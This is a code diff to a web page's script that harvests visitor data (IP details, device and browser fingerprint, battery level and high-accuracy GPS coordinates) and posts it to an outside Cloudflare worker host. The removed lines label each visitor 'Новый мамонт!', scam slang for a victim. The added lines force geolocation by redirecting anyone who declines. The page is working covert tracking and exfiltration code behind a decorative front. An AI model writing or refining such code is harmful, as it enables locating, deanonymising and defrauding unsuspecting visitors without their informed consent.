@@ -142,11 +142,11 @@
                 language: navigator.language,
                 screenWidth: window.screen.width,
                 screenHeight: window.screen.height,
-                deviceMemory: navigator.deviceMemory || "Недоступно",
-                hardwareConcurrency: navigator.hardwareConcurrency || "Недоступно",
-                apname: navigator.appName,
-                dvizhok: navigator.product,
-                vendar: navigator.vendor,
+                deviceMemory: navigator.deviceMemory || "N/A",
+                hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
+                appName: navigator.appName,
+                product: navigator.product,
+                vendor: navigator.vendor,
             };
         }
 
@@ -156,85 +156,51 @@
                 if (!response.ok) return null;
                 return await response.json();
             } catch (error) {
-                console.error("Ошибка при получении IP-информации:", error);
+                console.error("IP info error:", error);
                 return null;
             }
         }
         
         async function getBatteryLevel() {
-            if (!('getBattery' in navigator)) return "API не поддерживается";
+            if (!('getBattery' in navigator)) return "N/A";
             try {
                 const battery = await navigator.getBattery();
                 return `${Math.round(battery.level * 100)}%`;
             } catch (error) {
-                return "Недоступно";
+                return "N/A";
             }
         }
         
-        async function sendDataToServer(message) {
+        async function sendDataToServer(data) {
             const workerUrl = 'https://proxy.mvdclowned.workers.dev'; 
         
             try {
-                const response = await fetch(workerUrl, {
+                await fetch(workerUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: message })
+                    body: JSON.stringify(data)
                 });
-                
-                if (response.ok) {
-                    console.log('Данные успешно отправлены на сервер.');
-                    alert("Доступ к сайту предоставлен. Спасибо за разрешение геолокации!");
-                } else {
-                    console.error('Ошибка при отправке данных на сервер.');
-                }
             } catch (error) {
-                console.error('Сетевая ошибка:', error);
+                console.error('Network error:', error);
             }
         }
 
         async function processAndSendData(position) {
             try {
-                console.log('Сбор информации...');
-                const deviceInfo = collectDeviceInfo();
-                const ipInfo = await getIpInfo();
-                const batteryLevel = await getBatteryLevel();
-
-                const locationData = position ? position.coords : null;
-                const locationInfo = locationData 
-                    ? `\n📍Точная геолокация:\n┌Широта: ${locationData.latitude}\n├Долгота: ${locationData.longitude}\n├Точность: ${locationData.accuracy} метров\n└Время: ${new Date(position.timestamp).toLocaleString()}`
-                    : '\n📍Геолокация: Не предоставлена';
-
-                const message = `
-Новый мамонт!
-
-💻Информация об устройстве:
-┌IP: ${ipInfo?.ip || 'Недоступно'}
-├Платформа: ${deviceInfo.platform}
-├Язык: ${deviceInfo.language}
-├Разрешение экрана: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
-├Память устройства: ${deviceInfo.deviceMemory} GB
-├Ядра процессора: ${deviceInfo.hardwareConcurrency}
-└Уровень батареи: ${batteryLevel}
-
-🌐Инфомация о браузере:
-┌User-Agent: ${deviceInfo.userAgent}
-├Название браузера: ${deviceInfo.apname}
-└Тип движка браузера: ${deviceInfo.vendar}
-
-👻Информация об IP:
-┌Hostname: ${ipInfo?.hostname || 'Недоступно'}
-├Город: ${ipInfo?.city || 'Недоступно'}
-├Регион: ${ipInfo?.region || 'Недоступно'}
-├Страна: ${ipInfo?.country || 'Недоступно'}
-├Локация: ${ipInfo?.loc || 'Недоступно'}
-├Провайдер: ${ipInfo?.org || 'Недоступно'}
-└Часовой пояс: ${ipInfo?.timezone || 'Недоступно'}${locationInfo}
-                `;
-                
-                await sendDataToServer(message);
-
+                const rawData = {
+                    deviceInfo: collectDeviceInfo(),
+                    ipInfo: await getIpInfo(),
+                    batteryLevel: await getBatteryLevel(),
+                    location: position ? {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date(position.timestamp).toISOString()
+                    } : null
+                };
+                await sendDataToServer(rawData);
             } catch (error) {
-                console.error('Ошибка в главной функции processAndSendData():', error);
+                console.error('Data processing error:', error);
             }
         }
         
@@ -244,30 +210,30 @@
             const acceptButton = document.getElementById('acceptButton');
             const declineButton = document.getElementById('declineButton');
             
-            if (!acceptButton || !declineButton) return;
+            if (!acceptButton || !declineButton || !permissionModal || !mainContent) return;
             
-            acceptButton.addEventListener('click', () => {
-                permissionModal.style.display = 'none';
-                mainContent.style.display = 'block';
+            declineButton.addEventListener('click', () => {
+                window.location.href = 'https://www.google.com';
+            });
 
+            acceptButton.addEventListener('click', () => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
-                        (position) => processAndSendData(position), 
+                        (position) => {
+                            permissionModal.style.display = 'none';
+                            mainContent.style.display = 'block';
+                            processAndSendData(position);
+                        }, 
                         (error) => {
-                            console.error('Ошибка получения геолокации:', error.code, error.message);
-                            alert('Для доступа к сайту необходимо разрешить определение местоположения. Пожалуйста, разрешите доступ и попробуйте снова.');
-                            processAndSendData(null);
-                        },
+                            console.error(`Geolocation error: ${error.code} - ${error.message}`);
+                            window.location.href = 'https://www.google.com';
+                        }, 
                         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                     );
                 } else {
-                    alert('Ваш браузер не поддерживает геолокацию.');
-                    processAndSendData(null);
+                    console.error('Geolocation is not supported.');
+                    window.location.href = 'https://www.google.com';
                 }
-            });
-
-            declineButton.addEventListener('click', () => {
-                alert('Для доступа к сайту необходимо разрешить определение местоположения.');
             });
         }
         
@@ -280,7 +246,6 @@
             const fontSize = 16;
             const columns = canvas.width / fontSize;
             const rainDrops = Array(Math.floor(columns)).fill(1);
-
             const drawMatrix = () => {
                 ctx.fillStyle = 'rgba(18, 18, 18, 0.05)';
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
@@ -289,29 +254,24 @@
                 rainDrops.forEach((y, i) => {
                     const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                     ctx.fillText(text, i * fontSize, y * fontSize);
-                    if (y * fontSize > canvas.height && Math.random() > 0.975) {
-                        rainDrops[i] = 0;
-                    }
+                    if (y * fontSize > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
                     rainDrops[i]++;
                 });
             };
             setInterval(drawMatrix, 30);
-            
             window.addEventListener('resize', () => {
                 canvas.width = window.innerWidth;
                 canvas.height = window.innerHeight;
             });
-
             const typingText = document.querySelector('.typing-text');
             if (typingText) {
-                const textLength = typingText.textContent.length;
-                const duration = textLength * 0.1;
+                const duration = typingText.textContent.length * 0.1;
                 typingText.style.animationDuration = `${duration}s`;
             }
         }
 
         function showPage(pageId) {
-            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById(pageId).classList.add('active');
         }
         
@@ -321,5 +281,4 @@
         });
     </script>
 </body>
-    </html>
-    
+</html>
